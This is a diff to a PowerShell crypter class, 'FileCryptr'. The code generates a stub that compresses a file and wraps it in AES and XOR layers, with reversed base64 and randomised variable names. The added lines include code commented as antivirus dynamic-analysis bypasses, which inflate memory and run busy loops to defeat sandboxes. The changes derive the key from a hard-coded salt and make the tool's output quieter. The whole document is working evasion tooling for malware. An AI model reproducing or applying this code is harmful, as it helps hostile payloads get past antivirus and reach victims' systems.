@@ -3606,9 +3606,10 @@ Class FileCryptr {
         }
     }
     static [string] GetStub([string]$filePath) {
-        $key = [string]::Empty
-        # $key = [System.Convert]::ToBase64String($aesManaged.Key)
-        return [FileCryptr]::GetStub($filePath, $key)
+        [int]$keySize = 256;
+        [byte[]]$salt = [Convert]::FromBase64String('bz07LmY5XiNkXW1WQjxdXw==');
+        [string]$b64k = [convert]::ToBase64String([System.Security.Cryptography.Rfc2898DeriveBytes]::new([FileCryptr]::RNdvar(), $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA1).GetBytes($keySize / 8));
+        return [FileCryptr]::GetStub($filePath, $b64k);
     }
     static [string] RNdvar() {
         return [FileCryptr]::RNdvar(15)
@@ -3617,10 +3618,10 @@ Class FileCryptr {
         return [Guid]::NewGuid().Guid.subString($Length).replace('-', [string]::Join('', (0..9 | Get-Random -Count 1)))
     }
     static [string] GetStub([string]$filePath, [string]$b64key) {
-        Write-Output "[*] Reading file: '$($filePath)' ..."
+        Write-Verbose "[+] Reading file: '$($filePath)' ..."
         $codebytes = [System.IO.File]::ReadAllBytes($filePath)
         $stub = [string]::Empty; $compressionStream = $null
-        Write-Output "[*] Starting code layer  ..."
+        Write-Verbose "[+] Starting code layer  ..."
         $paddingmodes = 'PKCS7', 'ISO10126', 'ANSIX923', 'Zeros'
         $paddingmode = $paddingmodes | Get-Random
         $ciphermodes = 'ECB', 'CBC'
@@ -3630,9 +3631,8 @@ Class FileCryptr {
 
         $compressiontypes = 'Gzip', 'Deflate'
         $compressiontype = $compressiontypes | Get-Random
-
         # compress
-        Write-Output "[*] Compressing ..."
+        Write-Verbose "[+] Compressing ..."
         [System.IO.MemoryStream] $output = [System.IO.MemoryStream]::New()
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
@@ -3645,7 +3645,7 @@ Class FileCryptr {
         $compressedBytes = $output.ToArray()
 
         # generate key
-        Write-Output "[*] Generating encryption key ..."
+        Write-Verbose "[+] Generating encryption key ..."
         $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
         if ($ciphermode -eq 'CBC') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -3666,22 +3666,17 @@ Class FileCryptr {
         $aesManaged.BlockSize = 128
         $aesManaged.KeySize = 256
         $aesManaged.GenerateKey()
-
-        # encrypt
-        Write-Output "[*] Encrypting with AES..."
+        Write-Verbose "[+] Encrypting with AES..."
         $encryptor = $aesManaged.CreateEncryptor()
         $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
-        [byte[]] $fullData = $aesManaged.IV + $encryptedData
+        [byte[]]$fullData = $aesManaged.IV + $encryptedData
         $aesManaged.Dispose()
         $b64encrypted = [System.Convert]::ToBase64String($fullData)
-
-        #reverse base64 encrypted for obfuscation ;)
+        #reverse base64 encrypted for obfuscation
         $reversingb64encrypted = $b64encrypted.ToCharArray()
         [array]::Reverse($reversingb64encrypted)
         $b64encryptedreversed = -join ($reversingb64encrypted)
-
-        # xor encrypt
-        Write-Output "[*] Encrypting with XOR ..."
+        Write-Verbose "[+] Encrypting with XOR ..."
         # this is a literal fucking hell,i need to fucking set variable names for the goddang xor encryptor/decryptor at the stub
         $string = [FileCryptr]::RNdvar()
         # $method = [FileCryptr]::RNdvar()
@@ -3690,27 +3685,23 @@ Class FileCryptr {
         $xordData = [FileCryptr]::RNdvar()
         $xori = [FileCryptr]::RNdvar()
         $xorj = [FileCryptr]::RNdvar()
-        # now its the time to XOR encrypt the reversed AES encrypted payload
+        # Now its the time to XOR encrypt the reversed AES encrypted payload
         $XOREncKey = [FileCryptr]::RNdvar()
         $base64XOREncPayload = [Convert]::ToBase64String([xor]::Encrypt([System.Text.Encoding]::UTF8.GetBytes($b64encryptedreversed), [System.Text.Encoding]::UTF8.GetBytes($XOREncKey), 1))
-
-        # write
-        Write-Output "[*] Finalizing code layer ..."
+        Write-Verbose "[+] Finalizing code layer ..."
         # some AV's Dynamic Analysis bypasses
         $_Combinr = @()
-        $_Combinr += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet";Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
+        $_Combinr += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet"; Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
         $_Combinr += 'if (${30} -lt 250) {17} ${31} = "a" * 300MB {18}' + "`r`n"
         $_Combinr += '${19} = 0' + "`r`n"
         $_Combinr += '${20} = 30000000' + "`r`n"
-        $_Combinr += 'For (${19}=0; ${19} -lt ${20};${19}++) {17} ${19}++ {18}' + "`r`n"
+        $_Combinr += 'for (${19}=0; ${19} -lt ${20}; ${19}++) {17} ${19}++ {18}' + "`r`n"
         $stub += $_Combinr -join ''
-
         $_Combinr = @()
         $_Combinr += '${43} = [System.Text.Encoding]::UTF8.GetBytes("{42}")' + "`r`n"
         $_Combinr += '${44} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{0}"))' + "`r`n"
         $_Combinr += '${45} = [System.Text.Encoding]::UTF8.GetBytes(${44})' + "`r`n"
-        # start XOR decrypt sequence
-        $_Combinr += '${46} = $(for (${47} = 0; ${47} -lt ${45}.length; ) {17}' + "`r`n"
+        $_Combinr += '${46} = $(for (${47} = 0; ${47} -lt ${45}.length) {17}' + "`r`n"
         $_Combinr += '        for (${48} = 0; ${48} -lt ${43}.length; ${48}++) {17}' + "`r`n"
         $_Combinr += '            ${45}[${47}] -bxor ${43}[${48}]' + "`r`n"
         $_Combinr += '            ${47}++' + "`r`n"
